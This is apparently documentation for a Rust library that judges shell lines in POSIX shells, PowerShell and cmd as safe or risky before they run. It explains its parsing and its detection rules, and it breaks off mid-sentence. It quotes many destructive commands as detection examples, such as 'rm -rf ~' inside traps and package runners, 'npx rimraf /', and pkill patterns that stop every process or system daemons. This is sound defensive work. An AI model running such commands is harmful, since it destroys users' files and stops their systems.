# Shell

`milo-guards-shell` judges a shell line before it runs. It reads POSIX shells
(`sh`, `bash`, `zsh` and the ones that share their syntax), PowerShell and
Windows `cmd`.

```rust
classify(line, shell, &paths) -> Assessment
effect(line, shell, &paths) -> Effect
```

`shell` is a `Shell` (`Posix`, `PowerShell` or `Cmd`), which is
`#[non_exhaustive]`: a shell with a grammar of its own may be added, so a
caller's `match` on it needs a fallback arm. `paths` comes from
`Paths::new(cwd, home, workspaces)`.
The answer is `Safe`, or `Risky` with every finding: a rule, a reason a prompt
can show, and the argument it is about. The guard reads the line and never runs
it. It touches neither the file system nor the environment.

`effect` is a second answer from the same split: does the line only read? See
[Reads only](#reads-only). `explain` shows how a line was read, for a person
debugging a verdict: see [Explaining a line](#explaining-a-line).

The guard only reports. What to do about a finding is the caller's choice, and
nothing here knows about asking, refusing or modes. The types are core's; see
[Core](core.md).

## How it works

A line is judged in three steps.

1. **Split** the line into units, one for each program it runs.
2. **Detect**: rules read each unit and judge each path.
3. **Combine**: the line is safe only when no unit is risky. A risky line
   carries every finding.

The modules follow the steps. `posix`, `powershell` and `cmd` split a line with
their grammar. `launch` takes wrappers off and reads scripts handed to shells.
`unit` holds the unit and the helpers that read its arguments. `detect` holds
the rules. `path` is the shell's side of the path model. `inline` reads the code
an interpreter is given inline (see [Inline code](#inline-code)).

## Splitting

The line is split with the grammar of the shell that runs it. The caller says
which shell, with `Shell::Posix`, `Shell::PowerShell` or `Shell::Cmd`.
`Shell::for_program` maps a name such as `/bin/zsh` or `pwsh.exe` to one. The
parsers are tree-sitter's bash, PowerShell and batch grammars.

- Chains (`&&`, `||`, `;`), pipes, substitutions (`$(...)`), loops, blocks and
  subshells are walked.
- **Every branch counts**, whether or not it would run. `false && rm -rf ~` is
  risky.
- Where a grammar reads a line differently from the shell, the shell wins.
  A POSIX line's backslash-newlines are joined first, so `r\<newline>m` is
  `rm`. cmd's built-ins also split arguments at `,`, `;` and `=`. PowerShell's
  `--%` ends at `|`. PowerShell reads `$HOME\.ssh\id` as one word but its
  grammar fails at the backslash, so such a word is put in quotes first. A cmd
  "comment" that hides a command cannot be read.
- Fish has no grammar here. Its line is read as POSIX, which is still safe:
  what the grammar cannot parse comes back risky.

### Wrappers and scripts

Wrappers come off: `sudo`, `env`, `nice`, `timeout`, `xargs`, `find -exec`,
`Start-Process`, `start`. `sudo rm` is `rm`, run as root. So do the words that
run the command after them in a POSIX shell: `command`, `builtin`, zsh's
precommand modifiers `noglob`, `nocorrect` and `-` (they take no options, so
`noglob -- rm` runs a program named `--`), and `coproc`.

**Package runners** come off too, with each runner's own options skipped:
`npx`, `npm exec`, `pnpm dlx` (also `pnpx` and `pnx`, its aliases), `pnpm exec`,
`yarn dlx`, `yarn exec`, `bunx`, `bun x`, `deno x`, `dx`, `uvx`, `uv tool run`, `uv run`, `pipx run`. The
program the runner names is judged, with a version after the package taken
off (`npx rimraf@5`). Where the runner names the package apart from the
program (`npx -p pkg prog`, `uvx --from pkg prog`) the program is the one
after the options. An option that takes a value is skipped with it, because
one that is missed would turn its value into the program, so each table is
the runner's own list and not a guess: npm's is every setting of its config
definitions that is not a boolean with its shorthands (`npm -C dir`, `npx
--editor vim`, `npm exec --logs-dir x`), read as npm reads them (an
unambiguous start of a name is the option, `--ed vim`; `npm exec` takes a
`true` or `false` after a boolean; `npx` first puts its own `--` before the
program, so a word it took for a value that npm did not is the program);
pnpm's is its own string and number settings, `exec`'s `--resume-from`,
`dlx`'s `--allow-build` and npm's settings, which it reads too; yarn's is
the options of `yarn --help` that name a folder, a host, a number or a type;
bun's is the `--option=<val>` options of `bun --help` that also take the next
word (not `-c`, `--config` and `--inspect`, whose value only follows `=`);
bun itself takes the first word that does not start with a dash as its
subcommand, before any option reads a value (`bun -c rimraf a` runs `rimraf`,
`bun -F x echo` runs `bunx echo`, `bun --title repl` opens the REPL), so that
word is read too, and when it is `x`, `run`, `exec`, `repl` or a delete tool
both readings are judged and the riskier one counts (the two share the wrappers a line may have and at most 32 such forks are made in a line, past which it is unreadable, so a line that forks at every `bun` is too wrapped like any other, not slow); deno's is its option definitions that take one value; uv's is `uv run --help` and the hidden
options real uv still takes a value for (`--python-preference`,
`--python-fetch`, `--max-recursion-depth`); pipx's is `pipx run --help`
(`--fetch-missing-python` is a flag). `npm exec` and `npm x` take the first
`--` for themselves, before the program or after it (`npm exec sh -- -c
'cmd'` runs `sh -c 'cmd'`); `npx` hands it on. `npx -c`, `npm exec -c` and
`pnpm -c exec` (the option may stand before `exec` too) run a shell command,
and so does `yarn exec`, whose arguments are a script. npm's `-c` is found as
npm reads it, among every option before the program, also before `exec`: at
the end of a bundle (`npx -yc 'cmd'`), spelt `--c`, given its value after `=`
(`npx -c='cmd'`), or put before the subcommand (`npm -c 'cmd' exec`). A bundle
of any length is read to its end, never given up on as the program. Each is
read as a script: in cmd where the line is for Windows (npm and pnpm start the system
shell there, and PowerShell's own grammar does not apply), in POSIX otherwise.
`yarn` (also `yarn run`) and `bun` (also `bun run`) start a delete tool by its
name (`yarn run rimraf dist`). `pnpm NAME` runs the script NAME of the project
and, with none by that name, the program (pnpm: "will execute the command as a
shell script"), so it is read as `pnpm exec NAME` unless NAME is a command of
pnpm, its alias, or an npm command it passes on (`pnpm rm lodash` removes a
dependency): `recursive`, `multi` and `m` are pnpm's own spellings of `-r`, so
`pnpm recursive exec rm -rf ~` is read as `pnpm -r exec rm -rf ~`; `pnpm sh -c 'rm -rf ~'` and `pnpm find ~ -delete` are read like
the program, `pnpm rimraf dist` is a delete tool, and an unknown script name
(`pnpm lint`, `pnpm dev`, `pnpm build`) is safe. `bun run name`
also starts any program on the path when it is no script (`bun run rm -rf
x` deletes): a word after `bun run` and its options that is no file (no
folder in it, no extension) is judged as the program, so `bun run build` is
safe as an unknown name and `bun run sh -c 'rm -rf ~'` is read like `sh -c`.
Bare `bun name` runs only scripts and bins of the project, so only a delete
tool is read there. The delete tools that come as packages (`rimraf`, `del`
and `del-cli`, `premove`, `rmrf`) delete their operands, judged as `rm` judges them: `bunx rimraf /` and `pnpm dlx rimraf ~`
are `Delete`, `npx rimraf dist` is safe. Only `del` and `del-cli` have a dry
run, and only `--dry-run` is read as one: `del -n ~` deletes as far as the
guard knows. What a runner starts is a program, never a builtin of the shell,
so `npx cd src` does not move the rest of the line to `src`.

`bun` and `deno` are interpreters. The code given to `bun -e`, `--eval`, `-p`,
`--print` (also in a bundle, `bun -pe 'code'`, or with the code attached, `bun
-e'code'`) and `deno eval` is read and judged like the code of `node -e` (see
[Inline code](#inline-code)); in cmd and PowerShell lines it is not read, and
comes back as `Unknown`. `bun repl`, `deno repl`, a bare `deno` and a script
read from the input (`bun run -`, `deno run -`, `uv run -`) run code the guard
does not read: `Unknown`, or `RunDownloaded` after a download; in cmd and
PowerShell lines a REPL reads its input only when something is piped into it
(`echo x | deno`), and in cmd lines so does a script read from the input
(`type x.js | bun run -`). The options before the
subcommand are skipped with their values (`bun -d x:1 -e 'code'` is still
inline code). `bun exec 'script'` runs a shell script, read as POSIX like `sh
-c`. `bun run file`, `deno run file` and `bun file` are judged like `node
file`, so a script the same line writes is not read, also after options (`bun
--hot run file`) and after deno's `watch`, which is `run --hmr`. So is `uv run
file.py`, and `uv run --script file`: `uv` runs Python on the file, like
`python file`. `deno run npm:pkg` runs the package's program like a runner,
and so do `deno watch npm:pkg` and `deno npm:pkg`: deno's default subcommand
is `run`. `deno x` and `dx` are package runners, like `bun x`. In cmd lines
these runner parts of `bun`, `deno` and `dx` are read as in the other shells
(`bun x rimraf C:\`, `bun run rimraf C:\`, `deno run npm:rimraf C:\`,
`dx rimraf C:\`); what they read of an interpreter (a script from the input
that nothing is piped into, `bun exec`) is not, and inline code is `Unknown`
there. `deno -v` and `deno --help=full` only
print. The options of `deno` that take their value
only after `=` (`--reload`, `--env-file`) do not take the next word.

`coproc` is read as the shells read it. A simple command takes no name, so the
first word is the program (`coproc NAME cat` runs `NAME`); a group may take
one (`coproc NAME { … }`). The program is the first word past the name, the
`{` words that open the group (`coproc { { rm -rf ~; }; }` is read through
both), `NAME=value` words and `!`, as it is without `coproc`: `coproc FOO=1 rm
-rf ~`, `coproc { ! rm -rf ~; }` and `coproc NAME { FOO=1 rm -rf ~; }` judge
the `rm`. The grammar has no `coproc`, so three forms are not read, and are
risky:

- A loop, conditional, `case` or function after it, or inside its group
  (`coproc while …; do …; done`, `coproc NAME { for …; do …; done; }`), is cut
  into pieces whose body hides behind the program `do`: `Unreadable`.
- A redirect in front of the command (`coproc { 2>/dev/null rm -rf ~; }`,
  `coproc > out rm -rf ~`): the grammar takes the words after its target for
  more targets, so the command is not among the arguments: `Unreadable`.
- A `{` stuck to a word (`coproc {rm -rf ~;}`): zsh runs it as a group, the
  grammar reads `{rm` as a program of that name: `Unreadable`.

A script handed to a shell is split again, in its own grammar: `bash -c`,
`eval`, `cmd /c`, `powershell -Command`, `Invoke-Expression`. A nested script
counts as far as a depth limit, and the text of all the nested scripts read
for one line as far as a budget a few times the longest line. Past either, the
line is unreadable.

The other limits, each read as unreadable past it, and each pinned by a test
that finds the edge by measuring it and asserts both sides (see Tests):

| Limit | Value | What it bounds |
| --- | --- | --- |
| Line length | 64 KiB | text parsed at all |
| Parse tree depth | 400 levels | the walk, so the stack |
| Shells in shells | 8 | `bash -c "sh -c '…'"` |
| Wrappers in front of a program | 15 | `sudo env nice … rm` |
| `find` inside `find -exec` | 16 | the walk, so the stack |
| `find -exec` work | 1 MiB | each level runs its program once per place it searches, so levels multiply; counted in the bytes built to hand on, `{}` replaced, because a count of arguments misses one that holds thousands of `{}` |
| Opening `(` with none closed | 400 | counted before parsing, blind to quoting; only `(` is counted, not `{` or `[`: cmd's grammar takes time that grows with the square of the depth |
| `&`, and `|`, in cmd | 400 of each (`&&` and `||` once) | counted before parsing: cmd's grammar nests a chain a level for each, so past the parse tree depth the line is unreadable anyway, and for `&` it takes time that grows with the square of the chain to find that out (a chain of 7,280 commands took 1.6 s on one machine and 2.5 s on another) |
| Here-documents started on one line (POSIX) | 256 | counted before parsing: bash's grammar holds each until the line ends (a backslash continues it) and takes time that grows with the square of how many; here-strings are not counted, and nor are here-documents that follow a command on lines of their own (`cat <<A\n` repeated costs the text and no more); with no command before the `<<` the grammar is slow, see the noise below |

The grammars themselves take time that grows with the square of the line on
some noise that none of the counts above covers. Measured in a release build
at 65,000 bytes (the longest line), in POSIX: `)` repeated takes about 10 s, `)a`
repeated (32,000 times, so not only a run of one character) about 9 s, `a|`
repeated 19.7 s, `|` or `>` repeated 4 to 5 s, and `<` repeated 3 s; here-documents
with no command before the `<<`, which the count above does not reach because
each is closed or on a line of its own: `<<A\nA\n` repeated 3.6 s, `<<A;\n`
4.0 s, `<<A\n` 4.9 s, and `<<A;` sixteen to a line (under the count) 5.4 s (`cat <<A\n` repeated
takes 1 ms, so the cost is in the missing command); in PowerShell, `echo ` then
`${` repeated 17 s, and `"${` repeated 3.5 s; in cmd, `@` repeated about 10 s.
Another machine took twice as long (20 s for `)` and for cmd's `@`, 9.5 s for
`|` and `>`, 6.7 s for `<`, 19 s for `)a`). A debug build is about three times
slower (29 s for `)`). cmd's `&` and `|` are counted above. A real line
never has them, and they come back risky, so the guard is slow there, never
wrong.

The open-`(` count does not catch brackets that close. Balanced ones take
time too, measured in a release build at 64 KiB on the same branch: in POSIX,
`()` repeated 9.0 s and `f() ` repeated 1.1 s; in cmd, `(echo) ` repeated
5.2 s, and `echo ` then `$((1<<2)); echo ` repeated 3.2 s. These are examples
of what was measured, not every slow shape: a new measurement can find
another, and the list is not a promise that anything else is fast.

### Actions that run later

Some commands only register a script, which runs when something happens
rather than now. The script is read where it is written, in its own grammar,
and its findings are the line's, since the shell runs it as the same user.

- **`trap`** in a POSIX shell: `trap 'ACTION' SIGNAL…`, also `trap -- 'ACTION'
  …`, whichever signal (`EXIT`, `0`, `INT`, `TERM`, `ERR`, `DEBUG`, `RETURN`,
  `HUP`, a number, several at once). The action is read like an `eval`'s
  script: `trap 'rm -rf ~' EXIT` deletes the home directory. A double-quoted
  action is expanded when the trap is set and its result read as code when it
  runs, as `eval "…"` is, so whatever an expansion holds becomes code: `trap
  "echo $d" EXIT` is `unknown`, with the reason `runs a script only known when
  it runs`, like `eval "$x"`, and so is `trap "$x" EXIT`. The text around the
  expansions is still read, so `trap "rm -rf $d" EXIT` also carries the
  `delete` of `$d`, a path known only when it runs. `$HOME`, `$PWD` and
  `$TMPDIR` are the places the guard names and are not counted as
  expansions. A single-quoted action is not expanded when set and is read as
  written: `trap 'rm -f "$tmp"' EXIT` is `rm -f "$tmp"`, and `trap 'echo $d'
  EXIT` is safe.
- **Nothing runs** for `trap - EXIT` and `trap -- - INT` (put the default
  back), `trap '' INT` (ignore the signal), `trap -p`, `trap -l` and a bare
  `trap`.
- **PowerShell**: the block of `trap { … }`, and the block given with
  `-Action` to `Register-EngineEvent`, `Register-ObjectEvent`,
  `Register-WmiEvent` and `Register-CimIndicationEvent`. The grammar reads a
  block in place, so its commands are judged as if they stood on the line,
  and an action that is not a block written out is a script known only when
  it runs, which is `unknown`: `-Action $block`, `-Action ([scriptblock]::Create($t))`,
  an action given by position (`Register-EngineEvent X $block`) and any splat
  (`Register-EngineEvent @p`). By position, the action is the last of the
  parameters the command's names leave to be given by position, in the docs'
  order: source then action for `Register-EngineEvent`; object, event, source
  then action for `Register-ObjectEvent`; class or query, source then action
  for `Register-WmiEvent` and `Register-CimIndicationEvent`.
  `Register-ObjectEvent $timer Elapsed`, with no action, is safe.
- cmd has nothing like it.

The action runs in this shell, later: after the line's last command, or
between its commands (`DEBUG`, `ERR`, `RETURN`, a signal). It is judged as the
line leaves things, whichever is more conservative and needs the least state:

- **Where it runs.** Its relative paths are judged from where the line was
  at the `trap`. A `cd` (or `pushd`, `popd`, `Set-Location`) after it, anywhere
  in the line, makes those paths known only when it runs: `trap 'rm -rf
  build' EXIT; cd ~` deletes a path known only when it runs. A `cd` inside
  the action may run before the next command, so the rest of the line is read
  from somewhere unknown too. An absolute path or `~` is the same wherever the
  line has moved. A `cd` in a subshell, `$(…)` or a script in a process of
  its own is not a move of this shell, as it is not for any later path, so
  `trap 'rm -f lock' EXIT; (cd sub && make)` still runs `rm -f lock` from
  where it was set. `eval` runs in this shell, so its `cd` is a move.
  The exception is a trap a subshell copies: `ERR` and `DEBUG` (zsh also
  `ZERR`) in zsh, `ERR` with `set -E` and `DEBUG` and `RETURN` with `set -T` in
  bash, also in `$(…)`. It runs from where the subshell has moved to as
  well, so for these (and for a signal the guard does not know, or one known
  only when it runs) any `cd` after the `trap` counts, subshell or not:
  `trap 'rm -rf build' DEBUG; (cd /; true)` is a delete of a path known only
  when it runs. `EXIT` and the ordinary signals are reset in a subshell and
  keep the rule above.
- **Names in a finding.** A double-quoted action is read from its text with
  each expansion replaced by a placeholder variable; a finding about it names
  the action as written, never the placeholder.
- **Hidden names.** The action is a body (see Bodies below): when the line
  turns `dotglob` on anywhere, even after the `trap`, its wildcards match
  hidden names. An off switch inside it changes nothing for the rest of the
  line, and an on switch inside it stays on.
- **Nesting.** A `trap` inside a script, a `bash -c` or another `trap` counts
  as far as the depth limit. A `$(…)` in a double-quoted action is read where
  it stands, when the trap is set, and is a placeholder variable in the text
  the action is read from, so it is not read twice.

### Where a line is

A `cd` (or `pushd`, or `Set-Location`) moves the rest of the line. A later
relative path is judged from where it moved to. A `cd` inside a subshell or a
nested script in a process of its own does not reach the rest of the line;
`eval` runs in this shell, so its `cd` does; in a pipeline only zsh runs the
last stage in this shell, but, as for a `cd`, any stage counts. Where a `cd` went is
unknown when its target is, and then so is every relative path after it.
A device (`$null`, `NUL`, `NUL:`, `CON`, `/dev/null`) is the same in any folder,
so it is read as written, before the path is joined to where a `cd` moved:
`cd $dir; python x.py > $null` writes nothing, while `> out.txt` stays an
overwrite of a file only known when it runs. `$null` is the device only in
PowerShell, and only as the null value itself. In a POSIX shell it is the variable
`null`, only known when it runs; in cmd, and quoted in PowerShell (`'$null'`), it
is a file name like any other, joined to where the `cd` went.

In PowerShell, `cd -` and `cd +` go back or forward in location history, so the
place is only known when it runs.

In PowerShell a bare `NUL` or `CON` is the device only on the file system.
After a `cd` to the registry, `Env:`, `Variable:`, `Function:` or `Cert:`, or to
a place only known when it runs (it may be a registry key), it is an ordinary
item name there, so deleting, moving or changing it (`Remove-Item NUL`,
`Move-Item NUL x`, `Set-ItemProperty NUL`, `New-Item NUL`) changes the item of
that name, and a bare name is joined to where the `cd` went like any other.
Writes by a file system path (`> NUL`, `Out-File NUL`, `Tee-Object NUL`,
`Invoke-WebRequest -OutFile NUL`) fail in such a provider and stay harmless.
`Set-Content`, `Add-Content` and `Clear-Content` do not: the `Env:`,
`Variable:`, `Function:` and `Alias:` providers take content, so
`cd Function:; Set-Content NUL ...; NUL` defines and runs a function named `NUL`,
and they are judged as an item of the folder like a delete. So is the
destination of `Copy-Item` and `Move-Item`, which in the registry is a key.
A `$null` destination of those is no destination, so the item goes to the
folder the line is in. So does a `$null` or missing path of `New-Item` (with
`-Name` the path is optional). With `-Name` the item is `Path\Name`, judged as
that one path, so a `..` in the name is applied and a device path (`NUL`, `CON`)
is never the item itself. `$null` is the null value in any provider.

In PowerShell a rooted path with no drive (`\x`, `/x`, as in `cd \`) is on the
drive of the folder before it, so after `cd HKCU:\Software\Foo` it is
`HKCU:\x`, and after `cd Function:` it is `Function:\x`; it is on the file
system only when the folder before it is (a disk, or no earlier `cd` at all).
When that folder is only known when it runs, or is a provider path with no drive (`Registry::HKEY_CURRENT_USER\...`),
so is the rooted path. `~` is the home of the provider the folder is in, and
only the file system has one: after a `cd` to the registry, `Function:`, a
provider path, or a place only known when it runs, `cd ~` fails and the line
stays where it was, so a path starting with `~` is only known when it runs, and
so is a `cd` with no path. A `Set-Location` or `Push-Location` that is not the
first stage of its pipeline gets its path from the pipeline, not from home. A
drive's name may hold any character but `: / \ . ~` (`my_reg:`), so any such
name before a colon, other than one letter, is a drive that is not a disk. Once
the line makes a drive (`New-PSDrive`, `ndr`, `mount`), anywhere in its text,
even after the `cd` (a function body, a loop), a single letter in a `cd`
(`cd X:`) may be that drive and not a disk, so the place is only known when it
runs. Without one, a letter is a disk.
After a `cd` to a known place on the file system, the device is read as
written for every command. cmd and POSIX have no other provider.

A variable that names a place (`$HOME`, `%TEMP%`, `$env:TEMP`) stops naming it
once the line sets it anywhere: `TMPDIR=$HOME`, `set TEMP=...`, `unset HOME`.

### Hidden names

A POSIX wildcard skips a name that starts with a dot, so `rm -rf *git` leaves
`.git` alone. A line can switch that off, and then `*git` takes `.git`: bash's
`shopt -s dotglob`, zsh's `setopt globdots` (also spelled `dotglob`),
`set -o globdots`, and a non-empty `GLOBIGNORE` (bash turns `dotglob` on for
it). Once a POSIX line has turned one on, every later pattern in that shell is
judged as core judges a PowerShell or cmd wildcard: it can match a leading dot
(see [Core](core.md)). Each unit and each redirect carries the flag, like the
folder a `cd` moved to.

- **On.** `shopt -s dotglob` (also with `nullglob` and the like, `-sq`);
  zsh's `setopt globdots`, `GLOB_DOTS`, `glob_dots`, `dotglob` and `DOT_GLOB`
  (zsh ignores case and underscores), `unsetopt noglobdots` and `unsetopt
  nodotglob`; `set -o globdots`, `set -o dotglob`; zsh's flag `-4` for
  `set` and `setopt` (`+4` undoes it); `setopt -m` and `unsetopt -m` with any
  pattern, which may name it. An option name or flag only known when it runs
  counts as on.
- **`GLOBIGNORE`** turns it on when it is not empty: as `GLOBIGNORE=x` on a
  line of its own, after `export`, `declare`, `typeset`, `local` or `readonly`
  (quoted too: `export "GLOBIGNORE=x"`), with `+=`, as `let GLOBIGNORE=1` or
  `(( GLOBIGNORE=1 ))`, as `read GLOBIGNORE` or `printf -v GLOBIGNORE`, or as
  a `for` variable. An empty value turns nothing on. A command with
  `GLOBIGNORE=x` in front of it, or after `env`, was expanded by the shell
  before the variable applies, so only a script it starts (`GLOBIGNORE=x bash
  -c '…'`) is judged with it on. `BASHOPTS=dotglob` does the same for the bash
  it starts; as a statement it counts as on.
- **A shell's own start-up options** turn it on for the script that shell runs:
  `bash -O dotglob -c '…'`, `zsh -o globdots -c '…'`, `zsh -o dotglob`, `zsh -4`,
  `zsh --globdots`, and a name only known when it runs.
- **`source` and `.`** run a file the guard cannot read, which may turn it on,
  so a line that sources one is judged with it on afterwards.
- **Two flags.** The guard keeps bash's option and zsh's apart, and hidden
  names match when either is on. Bash's is turned on by `shopt -s`,
  `GLOBIGNORE` and `BASHOPTS`, and off by `shopt -u` and `unset GLOBIGNORE`
  (`unset -f GLOBIGNORE` removes a function and changes nothing). zsh's is
  turned on by `setopt`, `unsetopt no…`, `set -o globdots` or `dotglob`, and
  `-4`, and off by their opposites. `source`, a shell started with the option
  on, and a name only known when it runs turn both on. An off switch clears only
  its own flag, since in the other shell it is an error: `setopt globdots;
  shopt -u dotglob; rm -rf *git` and `shopt -s dotglob; unsetopt globdots; rm
  -rf *git` are still risky.
- **Off.** `shopt -u dotglob`, `unsetopt globdots`, `set +o globdots` and
  `unset GLOBIGNORE` turn their flag off, but only where the line is sure to run
  them in this shell. They count when the unit is reached directly or through
  `command`, `builtin`, `time`, `!` or `eval`, except that zsh's `command` does
  not count for zsh's flag (it looks up programs only) and `time` counts only
  in front (later it is the program of that name). zsh's `noglob`, `nocorrect` and
  `-` count for zsh's flag only: in bash and sh they are not found and the
  builtin after them never runs, so `shopt -s dotglob; noglob shopt -u dotglob;
  rm -rf *git` is still risky and `setopt globdots; noglob unsetopt globdots;
  rm -rf *git` is not. `nocorrect` is a reserved word in zsh, so like `time` it
  counts only in front, alone or after a leading `time` or `nocorrect`; after
  `noglob`, `-` or `builtin` zsh looks it up as a command and fails, so
  `setopt globdots; noglob nocorrect unsetopt globdots; rm -rf *git` is still
  risky. Behind `env`, `nohup`, `timeout`, `nice`, `stdbuf`,
  `sudo` or `find -exec` they run in a process of their own and change nothing.
  In a pipeline, after `&`, on the right of `&&` or `||`, in an `if`, `case`,
  loop or function body, they change nothing either: the line may not run them,
  or runs them in a subshell, so the rest stays judged with the option on.
- **Where it reaches.** It stays on for the rest of the line. A subshell,
  `$(…)`, and a script in a process of its own (`bash -c '…'`) give it back as
  it was: an option set inside `bash -c 'shopt -s dotglob'` does not reach the
  units after it. A script started while it is on inherits it, since an
  exported `GLOBIGNORE` would reach it. `eval` runs in this shell, so its change
  stays, except that an `eval` that is a stage of a pipeline runs in a subshell
  and can turn the option on but not off. An on switch in any pipeline stage
  reaches the units after it, which is conservative: zsh runs the last stage in
  the current shell, so `setopt globdots | cat; rm -rf *git` is risky.
- **Bodies.** A function body or a loop may run after the option is on, whenever
  it is called or comes round again. The guard records the units and redirects
  in them, and after the whole line is read, if the line ever turned the option
  on (anywhere, a script it ran included, even if it turned it off again), it
  judges them with it on: `f() { rm -rf *git; }; eval 'shopt -s dotglob'; f`.
  A script started with the option on (`bash -O dotglob -c f`, `GLOBIGNORE=x
  bash -c f`) counts, since the line may have exported a function to it, and so
  does a `GLOBIGNORE=x` in front of a call to a function the line defines
  (`GLOBIGNORE=x f`), which sets it while the body runs. A
  line that never turns it on is not changed by a body that only mentions the
  name (`echo dotglob`).
- **Listings.** A listing hands its pattern on with the flag it was written
  under, so `shopt -s dotglob; ls -d *git | xargs rm -rf` is the delete of
  `*git` with hidden names matching.

Not read, so the caller has to account for them: an option set by `~/.zshenv`
or `~/.bashrc`, a `BASH_ENV` file, an inherited `GLOBIGNORE` or `BASHOPTS`
from the environment the guard's caller runs in, and a `GLOBIGNORE` set by
`${GLOBIGNORE:=x}`. zsh's `(D)` glob qualifier (`rm -rf *git(D)`) is not read
either.

## The rules

A rule reads a unit's program, its flags, its operands and its redirects. It
never reads the raw text. `echo "rm -rf /"` is safe, because the program is
`echo`.

| Wire name | What it finds |
| --- | --- |
| `delete` | Deletes files beyond the workspace, the workspace itself, a sensitive or protected file, or a path known only when it runs; archives such files with an option that deletes what it archives. |
| `wipe_disk` | Formats, repartitions or writes over a disk. |
| `overwrite` | Writes into a file beyond the workspace, or a sensitive or protected one, or one a tool runs on its own; unpacks an archive into such a folder. |
| `git_discard` | Throws away work git cannot give back: uncommitted changes, untracked files, stashes, unmerged branches, tags, a submodule's changes. |
| `git_remote` | Rewrites or deletes branches on a remote. |
| `git_history` | Rewrites the repository's history, or what git keeps to recover it. |
| `permissions` | Changes permissions or ownership beyond the workspace or of a protected file, or opens files to everyone. |
| `system_settings` | Changes how the system runs: the registry, boot settings, restore points, accounts, the firewall, antivirus, script policy. |
| `read_secret` | Reads a key or a credential: a file a program opens, or a `<` redirect, that lands on a place core marks as holding one; also a disk, and what the kernel serves. See [Reading a key](#reading-a-key). |
| `elevated` | Runs as root or administrator. |
| `run_downloaded` | Runs a script it downloads, through a pipe or `Invoke-Expression`. |
| `run_input` | Runs commands read from its input (a pipe, a here-document), which the line does not show. |
| `stop_system` | Shuts the computer down, restarts it, or stops every process, or one the system needs. |
| `send_secret` | Sends a key, a credential or the environment off the machine. |
| `drop_data` | Deletes data in a database. |
| `unknown` | Runs a program or a script known only when it runs. |
| `unreadable` | The line, or part of it, cannot be read. |

The wire names never change. A reason is a few plain words that follow from
the rule: `deletes your home directory`, `runs code the guard does not read`.

### Stopping processes by name

`killall`, `pkill`, `taskkill` and `Stop-Process` (also `kill`, `spps`) are
judged one way. Stopping a process by a plain name is everyday work (your own
dev server, `killall Finder`) and is safe: `killall node` and `pkill node` are
the same line. It is `stop_system` when the line stops more than a name:

- **Every process.** A pattern that matches every process: `pkill -f .`,
  `pkill ''`, `pkill '.*'`, `killall -r .`, `Stop-Process -Name *`,
  `taskkill /IM *`. `pkill` and `killall -r` read a regular expression, and the
  guard asks whether every match must hold a letter or digit the expression
  spells out; `a*`, `(a|)`, `^` and `\w` do not. An expression it cannot read
  (an unclosed `(` or `[`) counts as matching everything. `Stop-Process -Name`
  and `taskkill /IM` read a wildcard (`*`, `?`, `[a-z]`), judged the same way
  after a trailing `.exe` is dropped. `killall5` and `pkill -v` (every
  process but the ones named) are always `stop_system`.
- **Every process of a user, a group or a terminal.** `pkill -u me`, `-U`,
  `-G`, `killall -u me`, `killall -t ttys000`, `killall -Z context`,
  `taskkill /FI "USERNAME eq me"`, given no name. With a name
  (`pkill -u me node`) it is the name that is judged. `killall -c name` is a
  name too, judged as the operands are (`killall -c loginwindow`,
  `killall -m -c .`).
- **Every process a selection picks.** `pkill` given no pattern stops whatever
  its selection picks: `-P`/`--parent`, `-s`/`--session` and `-g`/`--pgroup` of
  0 or 1, or of a value only known when it runs (`pkill -P 1`, the children of
  `launchd` or `init`, which is every app and daemon; `pkill -s 0`, the
  session of the shell that runs the line, which is the terminal's processes;
  `pkill -P "$(pgrep -x launchd)"`), and `-O`/`--older`, `-r`/`--runstates`,
  `--cgroup`, `--ns`, `--nslist`, `--env`, `-t`/`--terminal` with any value
  (`pkill --older 1`, `pkill -t ttys000`). `pkill -P $$` (the shell's own
  children, read by its source text), `pkill -F pids.txt`, `pkill -s 1234` and
  `pkill -P 1 node` (the name is judged) are not. A value an option takes is
  never a pattern (`pkill -q 1 -u me`, `-r R`).
- **Every process a filter picks.** `taskkill` given a filter and no `/IM` or
  `/PID` stops whatever the filter picks: `/FI "STATUS eq RUNNING"`, `/FI
  "MEMUSAGE gt 1"`, `/FI "PID gt 0"`. Only `IMAGENAME eq name` (judged as
  `/IM name` is), `USERNAME` (above) and `STATUS eq NOT RESPONDING`, which
  stops the programs that hang, are read; with `/IM`, `/PID` or an
  `IMAGENAME eq` filter, the other filters only narrow what is named, and the
  names are judged.
- **A process the system needs.** `launchd`, `systemd`, `init`, `kernel_task`,
  `kthreadd`, `WindowServer`, `loginwindow`, `explorer`, `csrss`, `winlogon`,
  `wininit`, `lsass`, `smss`, `services` and `svchost`, in any case and with
  `.exe` or a folder in front (`killall /sbin/init` picks the process by its
  file, so the last part of the name is the name). `pkill` and `killall
  -r`/`-m` search their regular expression in the name, so it is compared two
  ways, per alternative: whole, without its anchors and brackets (`^init$`,
  `/sbin/init`, `Explorer`); and as a regular expression, asking whether it
  can match a system name at all. A name is searched for in the system name:
  `pkill login`, `pkill launch` and `pkill Window` stop `loginwindow`,
  `launchd` and `WindowServer`. A leading `^` wants the name to start with it,
  a trailing `$` to end with it, `-x` both. The case counts, so `pkill -f
  server` is not `WindowServer`, unless it is ignored (`pkill -i`, `killall
  -I`). The expression is read with its syntax, never skipped for having
  some: `.`, a `[…]` set and an escape are one character, a group and `|` are
  read as they are, a `*`, `?` or `{0,…}` lets what it follows match nothing
  and `*`, `+` or `{n,m}` repeat it. Where the syntax is only known roughly
  (an escape, a collating element, `\b`, a back reference) it is read as
  matching more, so `pkill '[l]aunchd'`, `pkill 'log.n'`, `pkill 'login(window)?'`,
  `pkill 'a+'` and `pkill '[[:alpha:]]x'` are `stop_system` while `pkill
  '[n]ode'` and `pkill -f 'node.*server'` are not. Without `-f` a `/` ends
  a folder, so what follows it is the name (`pkill '/sbin/[i]nit'`); `-f`
  matches the whole command line, so there the pattern is also searched, `/`
  and all, in the usual command lines of the system processes
  (`/sbin/launchd`, `/System/Library/CoreServices/loginwindow.app/Contents/MacOS/loginwindow console`,
  the `WindowServer -daemon` in SkyLight, `/sbin/init`, `/lib/systemd/systemd`,
  `/usr/lib/systemd/systemd`), with the arguments launchd starts the first
  two with (its jobs for them run `loginwindow console` and `WindowServer
  -daemon`), and a match that is still going at the end of the line and can
  go on into a space counts, since any further arguments are not known:
  `pkill -f /System/Library`, `pkill -f System`, `pkill -f console`, `pkill
  -f -- -daemon`, `pkill -f 'WindowServer -daemon'` and `pkill -f 'systemd
  --user'` are `stop_system` while `pkill -f 'node server.js'`, `pkill -f
